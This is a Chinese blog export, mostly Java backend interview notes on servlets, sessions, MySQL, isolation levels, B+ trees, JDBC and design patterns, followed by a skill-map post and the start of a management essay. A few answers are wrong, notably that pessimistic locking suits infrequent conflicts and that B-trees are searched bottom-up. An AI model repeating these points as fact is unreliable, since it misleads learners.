id="servlet的生命周期是什么。servlet是否为单例以及原因是什么？"><a href="#servlet的生命周期是什么。servlet是否为单例以及原因是什么？" class="headerlink" title="servlet的生命周期是什么。servlet是否为单例以及原因是什么？"></a>servlet的生命周期是什么。servlet是否为单例以及原因是什么？</h4><p>Servlet 生命周期可被定义为从创建直到毁灭的整个过程。以下是 Servlet 遵循的过程：</p><ol><li><p>Servlet 通过调用 init () 方法进行初始化。</p></li><li><p>Servlet 调用 service() 方法来处理客户端的请求。</p></li><li><p>Servlet 通过调用 destroy() 方法终止（结束）。</p></li><li><p>最后，Servlet 是由 JVM 的垃圾回收器进行垃圾回收的。</p></li></ol><p>Servlet单实例，减少了产生servlet的开销；</p><h4 id="请你说说，cookie-和-session-的区别？"><a href="#请你说说，cookie-和-session-的区别？" class="headerlink" title="请你说说，cookie 和 session 的区别？"></a>请你说说，cookie 和 session 的区别？</h4><ol><li>cookie数据存放在客户的浏览器上，session数据放在服务器上。</li><li>cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗</li></ol><p>考虑到安全应当使用session。</p><ol start="3"><li>session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，考虑到减轻服务器性能方面，应当使用COOKIE。</li><li>单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。</li></ol><h2 id="数据库相关问题"><a href="#数据库相关问题" class="headerlink" title="数据库相关问题"></a>数据库相关问题</h2><h4 id="连接池"><a href="#连接池" class="headerlink" title="连接池"></a>连接池</h4><h4 id="请你讲解一下数据连接池的工作机制"><a href="#请你讲解一下数据连接池的工作机制" class="headerlink" title="请你讲解一下数据连接池的工作机制?"></a>请你讲解一下数据连接池的工作机制?</h4><p>J2EE 服务器启动时会建立一定数量的池连接，并一直维持不少于此数目的池连接。客户端程序需要连接时，池驱动程序会返回一个未使用的池连接并将其表记为忙。如果当前没有空闲连接，池驱动程序就新建一定数量的连接，新建连接的数量由配置参数决定。当使用的池连接调用完成后，池驱动程序将此连接表记为空闲，其他调用就可以使用这个连接。</p><h4 id="有哪些常用的连接池？"><a href="#有哪些常用的连接池？" class="headerlink" title="有哪些常用的连接池？"></a>有哪些常用的连接池？</h4><ul><li>c3p0</li><li>dbcp 是一个依赖commons-pool对象池机制的数据库连接池.</li><li>druid 阿里出品，淘宝和支付宝专用数据库连接池，但它不仅仅是一个数据库连接池，它还包含一个ProxyDriver，一系列内置的JDBC组件库，可以用来分析慢 SQL</li><li>Hikari Spring boot 默认的连接池</li></ul><h4 id="Hikari连接池配多大合适"><a href="#Hikari连接池配多大合适" class="headerlink" title="Hikari连接池配多大合适"></a>Hikari连接池配多大合适</h4><p>通常，MySQL数据库的默认最大连接数是100。Hikari 的默认值是 10 最好配置到 20。连接过多不利于性能的优化，这个也和数据库的 CPU 有关系，MySQL 的连接数一般配置为 CPU 核心数的两倍。</p><h3 id="数据库常见问题"><a href="#数据库常见问题" class="headerlink" title="数据库常见问题"></a>数据库常见问题</h3><h4 id="数据库常见优化方法"><a href="#数据库常见优化方法" class="headerlink" title="数据库常见优化方法"></a>数据库常见优化方法</h4><ol><li>合理设计数据库表结构</li></ol><p>MySQL可以很好的支持大数据量的存取，但是一般说来，数据库中的表越小，在它上面执行的查询也就会越快。因此，在创建表的时候，为了获得更好的性能，我们可以将表中字段的宽度设得尽可能小。</p><p>例如，在定义邮政编码这个字段时，如果将其设置为CHAR(255),显然给数据库增加了不必要的空间，甚至使用VARCHAR这种类型也是多余的，因为CHAR(6)就可以很好的完成任务了。同样的，如果可以的话，我们应该使用MEDIUMINT而不是BIGIN来定义整型字段。</p><p>另外一个提高效率的方法是在可能的情况下，应该尽量把字段设置为NOTNULL，这样在将来执行查询的时候，数据库不用去比较NULL值。<br>对于某些文本字段，例如“省份”或者“性别”，我们可以将它们定义为ENUM类型。因为在MySQL中，ENUM类型被当作数值型数据来处理，而数值型数据被处理起来的速度要比文本类型快得多。这样，我们又可以提高数据库的性能。</p><ol start="2"><li>使用连接（JOIN）来代替子查询(Sub-Queries)</li></ol><p>MySQL从4.1开始支持SQL的子查询。这个技术可以使用SELECT语句来创建一个单列的查询结果，然后把这个结果作为过滤条件用在另一个查询中。例如，我们要将客户基本信息表中没有任何订单的客户删除掉，就可以利用子查询先从销售信息表中将所有发出订单的客户ID取出来，然后将结果传递给主查询</p><ol start="3"><li>使用联合(UNION)来代替手动创建的临时表</li></ol><p>MySQL从4.0的版本开始支持union查询，它可以把需要使用临时表的两条或更多的select查询合并的一个查询中。在客户端的查询会话结束的时候，临时表会被自动删除，从而保证数据库整齐、高效。使用union来创建查询的时候，我们只需要用UNION作为关键字把多个select语句连接起来就可以了，要注意的是所有select语句中的字段数目要想同。下面的例子就演示了一个使用UNION的查询。</p><ol start="4"><li>合理创建索引</li></ol><p>在频繁查询的字段上才需要创建索引，反之不需要。</p><ol start="5"><li>避免使用大事务</li></ol><p>尽管我们可以使用子查询（Sub-Queries）、连接（JOIN）和联合（UNION）来创建各种各样的查询，但不是所有的数据库操作都可以只用一条或少数几条SQL语句就可以完成的。更多的时候是需要用到一系列的语句来完成某种工作。但是在这种情况下，当这个语句块中的某一条语句运行出错的时候，整个语句块的操作就会变得不确定起来。设想一下，要把某个数据同时插入两个相关联的表中，可能会出现这样的情况：第一个表中成功更新后，数据库突然出现意外状况，造成第二个表中的操作没有完成，这样，就会造成数据的不完整，甚至会破坏数据库中的数据。要避免这种情况，就应该使用事务，它的作用是：要么语句块中每条语句都操作成功，要么都失败。换句话说，就是可以保持数据库中数据的一致性和完整性。事物以BEGIN关键字开始，COMMIT关键字结束。在这之间的一条SQL操作失败，那么，ROLLBACK命令就可以把数据库恢复到BEGIN开始之前的状态。</p><h4 id="介绍一下-mysql的主从复制？"><a href="#介绍一下-mysql的主从复制？" class="headerlink" title="介绍一下 mysql的主从复制？"></a>介绍一下 mysql的主从复制？</h4><p>MySQL主从复制是其最重要的功能之一。主从复制是指一台服务器充当主数据库服务器，另一台或多台服务器充当从数据库服务器，主服务器中的数据自动复制到从服务器之中。对于多级复制，数据库服务器即可充当主机，也可充当从机。MySQL主从复制的基础是主服务器对数据库修改记录二进制日志，从服务器通过主服务器的二进制日志自动执行更新。</p><p>MySQL主从复制的两种情况：同步复制和异步复制，实际复制架构中大部分为异步复制。</p><p>复制的基本过程如下：</p><p>Slave上面的IO进程连接上Master，并请求从指定日志文件的指定位置（或者从最开始的日志）之后的日志内容。</p><p>Master接收到来自Slave的IO进程的请求后，负责复制的IO进程会根据请求信息读取日志指定位置之后的日志信息，返回给Slave的IO进程。返回信息中除了日志所包含的信息之外，还包括本次返回的信息已经到Master端的bin-log文件的名称以及bin-log的位置。</p><p>Slave的IO进程接收到信息后，将接收到的日志内容依次添加到Slave端的relay-log文件的最末端，并将读取到的Master端的 bin-log的文件名和位置记录到master-info文件中，以便在下一次读取的时候能够清楚的告诉Master“我需要从某个bin-log的哪个位置开始往后的日志内容，请发给我”。</p><p>Slave的Sql进程检测到relay-log中新增加了内容后，会马上解析relay-log的内容成为在Master端真实执行时候的那些可执行的内容，并在自身执行。</p><h4 id="介绍一下-数据库的三个范式？"><a href="#介绍一下-数据库的三个范式？" class="headerlink" title="介绍一下 数据库的三个范式？"></a>介绍一下 数据库的三个范式？</h4><ol><li>第一范式（1NF）强调的是列的原子性，即列不能够再分成其他几列。</li><li>第二范式（2NF）首先是 1NF，另外包含两部分内容，一是表必须有一个主键；二是没有包含在主键中的列必须完全依赖于主键，而不能只依赖于主键的一部分。<br>在1NF基础上，任何非主属性不依赖于其它非主属性[在2NF基础上消除传递依赖]。</li><li>第三范式（3NF）第三范式（3NF）是第二范式（2NF）的一个子集，即满足第三范式（3NF）必须满足第二范式（2NF）。首先是 2NF，另外非主键列必须直接依赖于主键，不能存在传递依赖。即不能存在：非主键列 A 依赖于非主键列 B，非主键列 B 依赖于主键的情况。</li></ol><h4 id="介绍一下，数据库乐观锁和悲观锁"><a href="#介绍一下，数据库乐观锁和悲观锁" class="headerlink" title="介绍一下，数据库乐观锁和悲观锁"></a>介绍一下，数据库乐观锁和悲观锁</h4><ol><li>悲观锁，锁定某行或者表，其他人无法操作，适用于冲突不频繁的情况</li><li>乐观锁，假设不会发生并发冲突，只在提交操作时检查是否违反数据完整性。</li></ol><p>乐观锁有两种常见实现：</p><ol><li>使用数据版本（Version）记录机制实现，这是乐观锁最常用的一种实现方式。何谓数据版本？即为数据增加一个版本标识，一般是通过为数据库表增加一个数字类型的 “version” 字段来实现。当读取数据时，将version字段的值一同读出，数据每更新一次，对此version值加一。当我们提交更新的时候，判断数据库表对应记录的当前版本信息与第一次取出来的version值进行比对，如果数据库表当前版本号与第一次取出来的version值相等，则予以更新，否则认为是过期数据。</li><li>使用时间戳（timestamp）。乐观锁定的第二种实现方式和第一种差不多，同样是在需要乐观锁控制的table中增加一个字段，名称无所谓，字段类型使用时间戳（timestamp）, 和上面的version类似，也是在更新提交的时候检查当前数据库中数据的时间戳和自己更新前取到的时间戳进行对比，如果一致则OK，否则就是版本冲突。</li></ol><h4 id="介绍一下数据库的隔离级别"><a href="#介绍一下数据库的隔离级别" class="headerlink" title="介绍一下数据库的隔离级别"></a>介绍一下数据库的隔离级别</h4><table><thead><tr><th>隔离级别</th><th>脏读（Dirty Read）</th><th>不可重复读（NonRepeatable Read）</th><th>幻读（Phantom Read）</th></tr></thead><tbody><tr><td>未提交读（Read uncommitted）</td><td>可能</td><td>可能</td><td>可能</td></tr><tr><td>已提交读（Read committed）</td><td>不可能</td><td>可能</td><td>可能</td></tr><tr><td>可重复读（Repeatable read）</td><td>不可能</td><td>不可能</td><td>可能</td></tr><tr><td>可串行化（Serializable ）</td><td>不可能</td><td>不可能</td><td>不可能</td></tr></tbody></table><p>未提交读(Read Uncommitted)：允许脏读，也就是可能读取到其他会话中未提交事务修改的数据。</p><p>提交读(Read Committed)：只能读取到已经提交的数据。Oracle等多数数据库默认都是该级别 (不重复读)。</p><p>可重复读(Repeated Read)：可重复读。在同一个事务内的查询都是事务开始时刻一致的，InnoDB默认级别。在SQL标准中，该隔离级别消除了不可重复读，但是还存在幻象读。</p><p>串行读(Serializable)：完全串行化的读，每次读都需要获得表级共享锁，读写相互都会阻塞，一般会使用分布式锁代替串行化。</p><p>不可重复读的和幻读很容易混淆，不可重复读侧重于<strong>修改</strong>，幻读侧重于<strong>新增或删除</strong>。解决不可重复读的问题只<strong>需锁住满足条件的行</strong>，<strong>解决幻读需要锁表</strong> 锁表就是串行化了。重复读指的是对某条记录而言，幻读是指对整个表而言。</p><h4 id="介绍下-B-树索引和-B-树索引的区别"><a href="#介绍下-B-树索引和-B-树索引的区别" class="headerlink" title="介绍下 B 树索引和 B+ 树索引的区别"></a>介绍下 B 树索引和 B+ 树索引的区别</h4><p>B+树是为磁盘或其他直接存取辅助设备而设计的一种平衡查找树，在B+树中，所有记录节点都是按键值的大小顺序存放在同一层的叶节点中，各叶节点指针进行连接。</p><p>B+树的特征：</p><ol><li><p>有k个子树的中间节点包含有k个元素（B树中是k-1个元素），每个元素不保存数据，只用来索引，所有数据都保存在叶子节点。</p></li><li><p>所有的叶子结点中包含了全部元素的信息，及指向含这些元素记录的指针，且叶子结点本身依关键字的大小自小而大顺序链接。（链表）</p></li><li>所有的中间节点元素都同时存在于子节点，在子节点元素中是最大（或最小）元素。</li><li>B+树查找时是从上到下查找；B-树则是从下往上查找（中序遍历）</li></ol><p>B+树的优势：</p><ol><li>单一节点存储更多的元素（这样该节点下分支变多了，树变矮胖了），使得查询的IO次数更少。</li><li>所有查询都要查找到叶子节点，查询性能稳定。</li><li>所有叶子节点形成有序链表，便于范围查询。</li></ol><p>B+树的核心点：</p><ol><li>非叶子节点不存放数据</li><li>叶子数据有全量数据</li><li>叶子节点构成链表，用于范围查询</li></ol><h4 id="mysql数据库的两种引擎区别"><a href="#mysql数据库的两种引擎区别" class="headerlink" title="mysql数据库的两种引擎区别"></a>mysql数据库的两种引擎区别</h4><p>InnoDB 是聚集索引，支持事务，支持行级锁；<br>MyISAM是非聚集索引，不支持事务，只支持表级锁。</p><p>基本都用 InnoDB。</p><h4 id="什么时候用Innodb什么时候用MyISAM"><a href="#什么时候用Innodb什么时候用MyISAM" class="headerlink" title="什么时候用Innodb什么时候用MyISAM?"></a>什么时候用Innodb什么时候用MyISAM?</h4><p>索引是对数据库表中一列或多列的值进行排序的一种结构，使用索引可快速访问数据库表中的特定信息。如果想按特定职员的姓来查找他或她，则与在表中搜索所有的行相比，索引有助于更快地获取信息。索引的一个主要目的就是加快检索表中数据的方法，亦即能协助信息搜索者尽快的找到符合限制条件的记录ID的辅助数据结构。InnoDB主要面向在线事务处理（OLTP）的应用。MyISAM主要面向一些OLAP的应用。</p><h4 id="JDBC中如何进行事务处理？"><a href="#JDBC中如何进行事务处理？" class="headerlink" title="JDBC中如何进行事务处理？"></a>JDBC中如何进行事务处理？</h4><p>Connection提供了事务处理的方法，通过调用setAutoCommit(false)可以设置手动提交事务；当事务完成后用commit()显式提交事务；如果在事务处理过程中发生异常则通过rollback()进行事务回滚。除此之外，从JDBC 3.0中还引入了Savepoint（保存点）的概念，允许通过代码设置保存点并让事务回滚到指定的保存点。</p><h4 id="Statement-和-PreparedStatement-的区别？哪个性能更好？"><a href="#Statement-和-PreparedStatement-的区别？哪个性能更好？" class="headerlink" title="Statement 和 PreparedStatement 的区别？哪个性能更好？"></a>Statement 和 PreparedStatement 的区别？哪个性能更好？</h4><p>与Statement相比，①PreparedStatement接口代表预编译的语句，它主要的优势在于可以减少SQL的编译错误并增加SQL的安全性（减少SQL注射攻击的可能性）；②PreparedStatement中的SQL语句是可以带参数的，避免了用字符串连接拼接SQL语句的麻烦和不安全；③当批量处理SQL或频繁执行相同的查询时，PreparedStatement有明显的性能上的优势，由于数据库可以将编译优化后的SQL语句缓存起来，下次执行相同结构的语句时就会很快（不用再次编译和生成执行计划）。</p><p>为了提供对存储过程的调用，JDBC API中还提供了CallableStatement接口。存储过程（Stored Procedure）是数据库中一组为了完成特定功能的SQL语句的集合，经编译后存储在数据库中，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。虽然调用存储过程会在网络开销、安全性、性能上获得很多好处，但是存在如果底层数据库发生迁移时就会有很多麻烦，因为每种数据库的存储过程在书写上存在不少的差别。</p><h4 id="请你谈谈JDBC的反射，以及它的作用？"><a href="#请你谈谈JDBC的反射，以及它的作用？" class="headerlink" title="请你谈谈JDBC的反射，以及它的作用？"></a>请你谈谈JDBC的反射，以及它的作用？</h4><p>通过反射com.mysql.jdbc.Driver类，实例化该类的时候会执行该类内部的静态代码块，该代码块会在Java实现的DriverManager类中注册自己,DriverManager管理所有已经注册的驱动类，当调用DriverManager.geConnection方法时会遍历这些驱动类，并尝试去连接数据库，只要有一个能连接成功，就返回Connection对象，否则则报异常。</p><h2 id="架构设计"><a href="#架构设计" class="headerlink" title="架构设计"></a>架构设计</h2><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><h4 id="有哪些常见的设计模式？"><a href="#有哪些常见的设计模式？" class="headerlink" title="有哪些常见的设计模式？"></a>有哪些常见的设计模式？</h4><ol><li>单例模式</li></ol><p>整个生命周期只需要一个实例，可以设计为单例节省系统资源。</p><ol start="2"><li>工厂模式</li></ol><p>使用工厂可以屏蔽构造出来的类的差异，适配不同的实现。</p><p>Spring boot 源码中启动 webserver 就是通过工厂构建出：Tomcat、Undertow、Jetty 等</p><p>RedisTemplate 连接的Redis 实例也是通过工厂构建的</p><ol start="3"><li>策略模式</li></ol><p>定义了算法族，分别封装起来，让它们之间可以互相替换。此模式让算法的变化独立于使用算法的客户。</p><p>例如 AES 加密算法可以有不同种策略。</p><p>系统的操作都要有日志记录，通常会把日志记录在数据库里面，方便后续的管理，但是在记录日志到数据库的时候，可能会发生错误，比如暂时连不上数据库了，那就先记录在文件里面。日志写到数据库与文件中是两种算法，但调用方不关心，只负责写就是。</p><ol start="4"><li>观察者模式，发布/订阅模式</li></ol><p>应用场景如下：</p><ol><li>对一个对象状态的更新，需要其他对象同步更新，而且其他对象的数量动态可变。</li><li>对象仅需要将自己的更新通知给其他对象而不需要知道其他对象的细节。</li></ol><p>后端用的不多，前端天生就是观察者模式</p><ol start="5"><li>迭代器模式</li></ol><p>迭代器模式提供一种方法顺序访问一个聚合对象中各个元素，而又不暴露该对象的内部表示。</p><p>应用场景如下：</p><p>当你需要访问一个聚集对象，而且不管这些对象是什么都需要遍 历的时候，就应该考虑用迭代器模式。其实stl容器就是很好的迭代器模式的例子。</p><p>List 相关实现，Map 相关实现，以及 JDBC 的结果集。</p><ol start="6"><li>构造者模式 Builder</li></ol><p>构造者模式，可以简化对象的赋值。</p><pre><code>public class Purchase {private final String shipNo;private final String menuId;private final String menuName;private final Double price;public static class Builder {    private final String shipNo;    private String menuId;    private String menuName;    private final Double price = 0.0;    public Builder(String shipNo) {        this.shipNo = shipNo;    }    public Builder menuId(String val) {        menuId = val;        return this;    }    public Builder menuName(String val){        menuName=val;        return this;    }    public Purchase build() {        return new Purchase(this);    }}private Purchase(Builder builder) {    shipNo = builder.shipNo;    menuId = builder.menuId;    menuName = builder.menuName;    price = builder.price;}}</code></pre><ol start="7"><li>Prototype 原型模式</li></ol><p>JS 就是基于原型链的实现模式，用原型创建目标对象的方法，不常用。</p><ol start="8"><li><p>Facade 门面模式</p></li><li><p>适配器模式</p></li></ol><p>适配器模式（Adapter Pattern）是作为两个不兼容的接口之间的桥梁。这种类型的设计模式属于结构型模式，它结合了两个独立接口的功能。</p><p>这种模式涉及到一个单一的类，该类负责加入独立的或不兼容的接口功能。举个真实的例子，读卡器是作为内存卡和笔记本之间的适配器。您将内存卡插入读卡器，再将读卡器插入笔记本，这样就可以通过笔记本来读取内存卡。</p><ol start="10"><li>过滤器模式</li></ol><p>过滤器模式（Filter Pattern）或标准模式（Criteria Pattern）是一种设计模式，这种模式允许开发人员使用不同的标准来过滤一组对象，通过逻辑运算以解耦的方式把它们连接起来。这种类型的设计模式属于结构型模式，它结合多个标准来获得单一标准。</p><p>过滤器模式在 Spring MVC 中非常常见。</p><ol start="11"><li>装饰器模式</li></ol><p>装饰器模式（Decorator Pattern）允许向一个现有的对象添加新的功能，同时又不改变其结构。这种类型的设计模式属于结构型模式，它是作为现有的类的一个包装。</p><p>这种模式创建了一个装饰类，用来包装原有的类，并在保持类方法签名完整性的前提下，提供了额外的功能，例如增加日志等功能。</p><ol start="12"><li>享元模式</li></ol><p>享元模式（Flyweight Pattern）主要用于减少创建对象的数量，以减少内存占用和提高性能。这种类型的设计模式属于结构型模式，它提供了减少对象数量从而改善应用所需的对象结构的方式。</p><p>享元模式可以提高性能。</p><ol start="13"><li>责任链模式</li></ol><p>顾名思义，责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。这种模式给予请求的类型，对请求的发送者和接收者进行解耦。这种类型的设计模式属于行为型模式。</p><p>在这种模式中，通常每个接收者都包含对另一个接收者的引用。如果一个对象不能处理该请求，那么它会把相同的请求传给下一个接收者，依此类推。</p><ol start="14"><li>命令模式</li></ol><p>命令模式（Command Pattern）是一种数据驱动的设计模式，它属于行为型模式。请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。</p><ol start="15"><li>MVC 模式</li></ol><p>MVC 模式代表 Model-View-Controller（模型-视图-控制器） 模式。这种模式用于应用程序的分层开发。</p><p>实际上大部分情况下是 MVCS（Model-View-Controller-Service） 模式。</p><ol start="16"><li>前端控制器模式</li></ol><p>前端控制器模式（Front Controller Pattern）是用来提供一个集中的请求处理机制，所有的请求都将由一个单一的处理程序处理。该处理程序可以做认证/授权/记录日志，或者跟踪请求，然后把请求传给相应的处理程序。以下是这种设计模式的实体。</p><ul><li>前端控制器（Front Controller） - 处理应用程序所有类型请求的单个处理程序，应用程序可以是基于 web 的应用程序，也可以是基于桌面的应用程序。</li><li>调度器（Dispatcher） - 前端控制器可能使用一个调度器对象来调度请求到相应的具体处理程序。</li><li>视图（View） - 视图是为请求而创建的对象。</li></ul><p>例如 Spring MVC 中的前端控制器。</p><ol start="17"><li>MVVM 模式</li></ol><p>MVVM是Model-View-ViewModel的简写。它本质上就是MVC 的改进版。MVVM 就是将其中的View 的状态和行为抽象化，让我们将视图 UI 和业务逻辑分开。</p><ol start="18"><li>Flux 模式</li></ol><p>Flux的核心思想就是数据和逻辑永远单向流动，保持整个应用的数据一致性。</p><p><img src="/interview/interview/java-server-enginer-interview/image-20200607180425228.png" alt="image-20200607180425228" style="zoom:50%;"></p><h3 id="UML"><a href="#UML" class="headerlink" title="UML"></a>UML</h3><h4 id="常见的-UML-图例有哪些？"><a href="#常见的-UML-图例有哪些？" class="headerlink" title="常见的 UML 图例有哪些？"></a>常见的 UML 图例有哪些？</h4><ul><li><p>用例图（use case diagram）</p></li><li><p>类图（class diagram）</p></li><li>时序图（sequence diagram）</li><li>协作图（collaboration diagram）</li><li>状态图（statechart diagram）</li><li>活动图（activity diagram）</li><li>构件图（component diagram）</li><li>部署图（deployment diagram）</li></ul><h4 id="类图中元素有哪些关系？"><a href="#类图中元素有哪些关系？" class="headerlink" title="类图中元素有哪些关系？"></a>类图中元素有哪些关系？</h4><p>类图中元素的关系主要有:</p><ol><li>继承，对类而言</li></ol><p><img src="/interview/interview/java-server-enginer-interview/082337119585644.png" alt="img"></p><ol start="2"><li>实现，对接口而言</li></ol><p><img src="/interview/interview/java-server-enginer-interview/082337272699031.png" alt="img"></p><ol start="3"><li>聚合，A 中拥有一个 B，但 B 脱离于 A 仍然可以独立存活。</li></ol><p><img src="/interview/interview/java-server-enginer-interview/082338012654178-20200607181538580.png" alt="img"></p><ol start="4"><li>组合，A 中拥有一个 B，B 脱离 A 后在系统中没有任何存活的意义。</li></ol><p><img src="/interview/interview/java-server-enginer-interview/082338094143285.png" alt="img"></p><ol start="5"><li>依赖，B 的变化会影响 A，则 A 依赖于 B。</li></ol><p><img src="/interview/interview/java-server-enginer-interview/082339218484060.png" alt="img"></p><h3 id="性能设计"><a href="#性能设计" class="headerlink" title="性能设计"></a>性能设计</h3><h4 id="MySQL-单机并发多高？"><a href="#MySQL-单机并发多高？" class="headerlink" title="MySQL 单机并发多高？"></a>MySQL 单机并发多高？</h4><h4 id="Nginx-单机并发多高？"><a href="#Nginx-单机并发多高？" class="headerlink" title="Nginx 单机并发多高？"></a>Nginx 单机并发多高？</h4><h4 id="Spring-boot的项目单机并发多高？"><a href="#Spring-boot的项目单机并发多高？" class="headerlink" title="Spring boot的项目单机并发多高？"></a>Spring boot的项目单机并发多高？</h4><h4 id="Nodejs-单机并发多高？"><a href="#Nodejs-单机并发多高？" class="headerlink" title="Nodejs 单机并发多高？"></a>Nodejs 单机并发多高？</h4><h4 id="Redis-单机并发多高？"><a href="#Redis-单机并发多高？" class="headerlink" title="Redis 单机并发多高？"></a>Redis 单机并发多高？</h4><h4 id="如何计算系统容量？"><a href="#如何计算系统容量？" class="headerlink" title="如何计算系统容量？"></a>如何计算系统容量？</h4><h3 id="场景问题"><a href="#场景问题" class="headerlink" title="场景问题"></a>场景问题</h3><h4 id="现在有十万个单词，请你找出重复次数最多的十个。"><a href="#现在有十万个单词，请你找出重复次数最多的十个。" class="headerlink" title="现在有十万个单词，请你找出重复次数最多的十个。"></a>现在有十万个单词，请你找出重复次数最多的十个。</h4><p>可以通过 hash 进行分流到不同的机器槽位上，然后分布式并行运算。</p><h4 id="这里有10万个数，请你按照从小到大的顺序，将他们输出"><a href="#这里有10万个数，请你按照从小到大的顺序，将他们输出" class="headerlink" title="这里有10万个数，请你按照从小到大的顺序，将他们输出"></a>这里有10万个数，请你按照从小到大的顺序，将他们输出</h4><p>先划分成多个小文件，送进内存排序，然后再采用多路归并排序。</p><h4 id="处理海量数据-的问题，怎样在10亿个数中，找出最大的10个数，谈谈思路"><a href="#处理海量数据-的问题，怎样在10亿个数中，找出最大的10个数，谈谈思路" class="headerlink" title="处理海量数据 的问题，怎样在10亿个数中，找出最大的10个数，谈谈思路"></a>处理海量数据 的问题，怎样在10亿个数中，找出最大的10个数，谈谈思路</h4><p>建立一个大小为10的小根堆。</p><h4 id="请你设计一种方案，给每个组分配不同的IP段，并且可以快速得知某个IP是哪个组的"><a href="#请你设计一种方案，给每个组分配不同的IP段，并且可以快速得知某个IP是哪个组的" class="headerlink" title="请你设计一种方案，给每个组分配不同的IP段，并且可以快速得知某个IP是哪个组的?"></a>请你设计一种方案，给每个组分配不同的IP段，并且可以快速得知某个IP是哪个组的?</h4><ol><li>通过子网掩码</li><li>创建一个二叉查找树</li></ol><h4 id="这里有1000个任务，分给10个人做，你会怎样分配，先在纸上写个最简单的版本，然后优化。"><a href="#这里有1000个任务，分给10个人做，你会怎样分配，先在纸上写个最简单的版本，然后优化。" class="headerlink" title="这里有1000个任务，分给10个人做，你会怎样分配，先在纸上写个最简单的版本，然后优化。"></a>这里有1000个任务，分给10个人做，你会怎样分配，先在纸上写个最简单的版本，然后优化。</h4><ol><li>全局队列，把1000任务放在一个队列里面，然后每个人都是取，完成任务。</li><li>分为10个队列，每个人分别到自己对应的队列中去取务。</li><li>通过取模分片计算</li></ol>]]></content>
      
      
      <categories>
          
          <category> interview </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>技能树和个人发展方向</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/my-skill-map/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/my-skill-map/</url>
      
        <content type="html"><![CDATA[<p>定位：分布式系统架构师和 java 中间件开发者</p><p>擅长：领域建模、IAM、API设计、性能优化</p><h2 id="知识树模型"><a href="#知识树模型" class="headerlink" title="知识树模型"></a>知识树模型</h2><ul><li>树根<ul><li>哲学和逻辑推理</li><li>计算机数学</li><li>计算机科学<ul><li>算法和数据结构</li><li>计算机网络</li><li>操作系统</li></ul></li></ul></li><li>树干<ul><li>分布式系统微服务知识</li><li>领域驱动设计知识</li></ul></li><li>树冠<ul><li>应用框架</li></ul></li></ul><h2 id="知识圈层模型"><a href="#知识圈层模型" class="headerlink" title="知识圈层模型"></a>知识圈层模型</h2><ul><li>核心层<ul><li>Java<ul><li>并发</li><li>JVM</li></ul></li><li>Spring 开发生态</li><li>Mysql </li><li>Redis</li><li>Rocketmq</li></ul></li><li>拓展层<ul><li>前端</li><li>Linux 操作系统</li><li>Devops</li><li>安全</li><li>算法</li></ul></li><li>战略层<ul><li>培训</li><li>写作</li><li>方法论 </li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>好领导，本来应是挖渠人</title>
      <link href="/management/management/manage-method/"/>
      <url>/management/management/manage-method/</url>
      
        <content type="html"><![CDATA[<ul><li>被管理者谈管理</li><li>工作阻力 <ul><li>独自克服困难的人和及时寻求帮助的人</li><li>阻力不由个人意志决定，坚持科学发展观</li></ul></li><li>疏和堵<ul><li>疏是顺势而为</li><li>堵是克服人性</li></ul></li><li>管理的三种层次<ul><li>最次的</li><li>一般的</li><li>最好的</li></ul></li></ul><p>本次博客大赛除了技术类文章之外，想尝试一下其他类型的文章，说点闲话，聊聊管理这种高大上的内容，纯当做消遣。</p><p>大多数谈论经管类的文章，作者都是企业高管，或者社会名人、公知。视角往往都是自上而下，先从战略规划，再到具体实践，高屋建瓴，视角宏远。作为一个长期一线的程序员，大多数情况下都是被管理者，我在想是不是也能从另外一个视角发出自己的声音，对我们日常团队协作有些许帮助。</p><h3 id="手机配件送货员的故事"><a href="#手机配件送货员的故事" class="headerlink" title="手机配件送货员的故事"></a>手机配件送货员的故事</h3><p>我比较幸运，无论是读书时期的兼职零工，还是毕业后的正式工作，和老板（直属领导）关系都还行，没有发生一些不愉快的事情。不过对身边发生的一些见闻感触很多。</p><p>高中毕业的时候在老家的小城市找了一份暑期兼职，工作的内容就是在手机零配件批发部给手机维修师傅送货。那个时候还是功能机时代，手机维修的需求很多，手机维修需要一些屏幕、听筒、排线等配件。城市不大，骑个自行车市区10 -20 分钟内大部分地方可以送到，所以老板喜欢招一些年轻小伙儿送货，人力便宜还身手敏捷。当然也有中年人做这个，临时混口饭吃。</p><p>我们店的老板姓陈，每天坐在店里接电话出货。大家都叫他老陈，为人很和气，不管是客户还是员工遇到的问题都尽力帮忙解决，跟他干还是比较开心。手机和配件这个行业在当时的小城市属于暴利行业，一块商务电池进价 20 元，给维修师傅的价格是 60 元，最终顾客需要支付 100 - 200 元不等。</p><p>隔壁陆陆续续开过几家新的批发铺子，都不太长久。有一次中午吃饭认识了一个隔壁的送货小哥，我叫他黄哥，给我说干啥都不容易，他们那个老板很烦，经常数落他们。客户(维修师傅)有时候摸不清需要更换什么配件，往往弄错，于是他们就来回跑。浪费时间不说，空跑也不挣钱，老板就责怪他们为啥不问清楚再送，如果维修师傅经常这样，就加钱或者不送了。</p><p>我感到很惊讶，这算啥事儿啊。我们之前也遇到这些问题，就给老陈吐槽这事儿。老陈说你们来回跑怪累的，我这就去买一些包，下次你就把常用的都带上，有个包放收据啥的也方便。工作中这样的例子很多，有啥事儿就给老陈说，一起想想如何改进也就解决了。</p><p><strong>优秀的管理者，应是挖渠人。利用自己的位置和资源帮助解决问题，让员工工作流畅，就像春耕时期引水灌溉一样，及时疏通水渠中的石头和杂草，而不是怪水流的太慢。</strong></p><h3 id="ThoughtWorks-的一个同事"><a href="#ThoughtWorks-的一个同事" class="headerlink" title="ThoughtWorks 的一个同事"></a>ThoughtWorks 的一个同事</h3><p>刚到 ThoughtWorks 